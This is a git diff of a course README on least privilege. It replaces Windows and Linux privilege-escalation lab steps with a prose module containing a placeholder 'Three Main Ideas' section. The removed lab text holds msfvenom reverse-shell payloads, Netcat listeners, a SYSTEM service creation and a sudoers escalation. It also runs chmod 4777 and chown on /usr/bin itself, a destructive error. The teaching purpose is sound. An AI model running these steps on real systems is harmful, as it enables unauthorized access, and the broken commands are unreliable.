@@ -1,125 +1,38 @@
-# Security First Principles: Least Privilege Labs
-Created for DSU's Cyber Operations I course
+# Security First Principles: Least Privilege Module
+Sample lab for DSU's Cyber Operations I course
 
-| Box Name | Type |
-| -------- | ------- |
-| Linux Exercises | Kali 2023.3 |
-| Windows Exercises | Windows 10 Pro build 19044 |
-* Windows Defender is disabled via Group Policy on the Windows Exercises box.
+## General Information
+-   Author: Wyatt Tauber
+-   Date: November 27th, 2023
+-   Description: This course module discusses the security first principle of least privilege as well as privilege escalation vulnerabilities.
 
-## Lab Exercise 1: Widnows Horizontal/Vertical PrivEsc
-### Configuration
-#### Horizontal PrivEsc via Unquoted Service Path
-1. Add two additional users the box, with different passwords. One should be a standard user and the other should be an administrator. Use the administrator-level user for the following steps.
-2. Create a "Step 4" folder on the desktop of the selected user.
-3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
-     * Ensure the `Level 2 Name` contains a space (ex. `Service Run`)
-     * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
-5. Edit the `Level 1 Name` folder properties to grant all users write permission (Properties > Security > Users > Edit > Write).
-6. Create a new registry key in `HKLM\SYSTEM\CurrentControlSet\Services`. This key will be the service name.
-7. Add the following values to the key:
+## Why You Should Care
+Access control rules apply to every object in an operating system. Organizations frequently experience data loss through privilege escalation vulnerabilities resulting from the misconfiguration of this access for services or user accounts. Some of the most common problems result from internet-facing features running as root, employees with significant scope creep as they change roles, and the misconfiguration of program or file permissions. Many other privilege escalation vulnerabilities are far more nuanced.
 
-    | Name | Type | Data |
-    | -------- | ------- | ------- |
-    | (Default) | REG_SZ | (value not set) |
-    | DisplayName | REG_SZ | [Service Name] |
-    | ErrorControl | REG_DWORD | 0x00000001 (1) |
-    | ImagePath | REG_EXPAND_SZ | [Path to Dummy Service Executable **without quotes**] |
-    | ObjectName | REG_SZ | .\\[User Name] |
-    | Start | REG_DWORD | 0x00000002 (2) |
-    | Type | REG_DWORD | 0x00000010 (16) |
+Each of these issues can be addressed by the security first principle of least privilege, which ensures that users are given only the minimum level of privileges and permissions needed to perform required tasks. Organizations can protect themselves through the implementation of standardized security models, technical safeguards, and routine job responsibility audits. These actions reduce an organization’s attack surface, significantly curtailing the risk to business assets, operations, and people.
 
-8. Restart the box.
-9. Open the Services MMC snap-in. The `[Service Name]` should appear in the list. Ensure the startup type is set to Automatic so it executes when the box starts.
+## Three Main Ideas
+1.	Idea 1
+2.	Idea 2
+3.	Idea 3
 
-#### Vertical PrivEsc
-1. Temporarily elevate the service created in Horizontal PrivEsc to system (Properties > Log on > Log on as: > Local System account).
-2. Get a SYSTEM shell by following the steps in [Horizontal PrivEsc Exploitation](#Horizontal-PrivEsc-via-Unquoted-Service-Path).
-3. Create the "Step 6" folder in C:\Windows\System32.
-4. Restore the service created in Horizontal PrivEsc to running as the selected user (Properties > Log on > Log on as: > This account: > [select account via Browse and provide password]).
+## Example
+### Scenario
+An overworked systems administrator for a small business is deploying a LAMP (Linux, Apache, MySQL, PHP) stack on a CentOS box in the company's DMZ to test a new e-commerce platform before its launch. The administrator is encountering several conflicts with SELinux (Security Enhanced Linux), which is blocking new PHP connections to the MySQL database and preventing Apache from accessing files in the `/var/www` directory.
 
-### Exploitation
-#### Horizontal PrivEsc via Unquoted Service Path
-1. Log on to the second user created in Configuration step 1.
-2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
-      * In the example above, this would be `Service.exe`.
-      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service.exe` in the Windows PrivEsc folder in the repo. It connects to port 1337.
+### Poor Practice
+The administrator doesn't want to spend time configuring and debugging SELinux policies since this is just a test server. Therefore, the administrator disables SELinux and runs the LAMP stack as the root user to avoid further issues. This violates the principle of least privilege as web services do not need to access to the entire operating system to function.
 
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
-```
+A new CVE for this version of Apache is announced a few days later, and the administrator doesn't have time to pay attention to or patch these either. The unpatched server shows up in an attacker's routine `nmap`` scans, and they compromise the Apache web server and deface the e-commerce platform to sell counterfeit fashion products for several weeks. The small business becomes aware of the issue when they receive a cease and desist letter from the fashion company for distributing counterfeit products, and their reputation is damaged.
 
-2. SCP the generated file from the Linux Exercises box to `C:\Program Files\[Level 1 Name]` on the Windows Exercises box.
-3. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1337`.
-4. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of the first user. Use `whoami` to verify this.
+### Best Practice
+The administrator spends a significant amount of time learning how to set up LAMP securely on CentOS, and how to write proper SELinux rules for a web server. Management isn't terribly happy about the time it took to set up the server, but the administrator's completed SELinux configuration ends up being deployed on the production webserver as well.
 
-#### Vertical PrivEsc
-1. Get an administrator shell by following the steps in [Horizontal PrivEsc Exploitation](#Horizontal-PrivEsc-via-Unquoted-Service-Path).
-2. Create another simple TCP reverse shell with `msfvenom` on the Linux Exercises box, but it listens on a different port and can use any file name:
-      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service2.exe` in the Windows PrivEsc folder in the repo. It connects to port 1338.
+Even though they still don't have enough time to patch the Apache CVE, the attacker is relatively unskilled and unwilling to spend time attempting to exploit a target with SELinux running. They move on to an easier target. When several competitiors are compromised and their websites are taken down, the small business gains several new customers.
 
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1338 -f exe -o [Filename].exe
-```
-
-3. SCP the generated file from the Linux Exercises box to the Windows Exercises box. The location is insiginficant.
-4. On the administrator shell, create a SYSTEM-level service that runs the file automatically on startup:
-
-```
-sc create [ServiceName] binPath= "[C:\Path\To\New\Shell.exe]" start= auto
-```
-
-5. Start a Netcat listener on the Linux Exercises box with `nc -nvlp 1338`.
-6. Restart the Windows Exercises box. A Windows shell should spawn in the Netcat session with the permissions of SYSTEM. Use `whoami` to verify this.
-
-## Lab Exercise 2: Linux Horziontal PrivEsc via SUID
-### Configuration
-1. Add two additional users the box, with different passwords. Only one of these users should be allowed to use `sudo`. Use the sudo-enabled user for the following steps.
-2. Create a "Step 4" folder on the desktop of the first user.
-3. Build the modified Bash shell in the Linux PrivEsc/Lab 2 folder in the repo with `./configure` and `make`. Name it `shell`.
-      * This modification always runs the Bash shell in privileged mode (so that the SUID bit won't be [ignored by default](https://www.gnu.org/software/bash/manual/bash.html)).
-      * A pre-built `shell` for the Linux Exercises box is also in the folder.
-4. Place the `shell` in the `/usr/bin` folder.
-5. Set the owner and group (if applicable) and the SUID bit on the file:
-      * If set correctly, permissions should be `-rwSrwxrwx` and the user and group will be the first user.
-
-```
-chown [first user] /usr/bin
-chgrp [first user] /usr/bin
-chmod 4777 /usr/bin
-chmod u-x /usr/bin
-```
-
-### Exploitation
-1. Log on to the second user created in Configuration step 1.
-2. Execute the `/usr/bin/shell` file. A Bash shell should spawn with the permissions of the first user. Use `whoami` to verify this.
-
-## Lab Exercise 3: Linux Vertical PrivEsc via visudo
-### Configuration
-1. Using `sudo` as the first user, create a "Step 5" folder in the home directory of the root user.
-2. Use `visudo` to edit the `/etc/sudoers` file. Add a line for your second user to allow them to run `visudo` beneath the root user:
-      * A preconfigured `/etc/sudoers` file is `sudoers.old` in the Linux PrivEsc/Lab 3 folder in the repo as well.
-
-```
-# User privilege specification
-root	ALL=(ALL:ALL) ALL
-[second user name]	ALL=/usr/sbin/visudo
-```
-
-3. Save the file
-
-### Exploitation
-1. Run `visudo` as the second user.
-2. Append `,/usr/bin/su` to the privilege specifcation for the second user:
-      * A preconfigured `/etc/sudoers` file is `sudoers` in the Linux PrivEsc/Lab 3 folder in the repo as well.
-
-```
-# User privilege specification
-root	ALL=(ALL:ALL) ALL
-[second user name]	ALL=/usr/sbin/visudo,/usr/bin/su
-```
-
-3. Save the file
-4. Run `sudo su` as the second user. A root shell will spawn.
-
-## Puzzler: Correcting PrivEsc Vulnerabilities
+## Additional Resources
+1.  [What Is Privilege Escalation?](https://www.proofpoint.com/us/threat-reference/privilege-escalation)
+1.  [Hidden Danger: How To Identify and Mitigate Insecure Windows Services](https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/)
+2.  [Privilege escalation on Windows: When you want it and when you don’t](https://delinea.com/blog/windows-privilege-escalation#vert-hor)
+3.  [Linux permissions: SUID, SGID, and sticky bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)
+4.  [Chapter 12. Managing sudo access](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_basic_system_settings/managing-sudo-access_configuring-basic-system-settings)
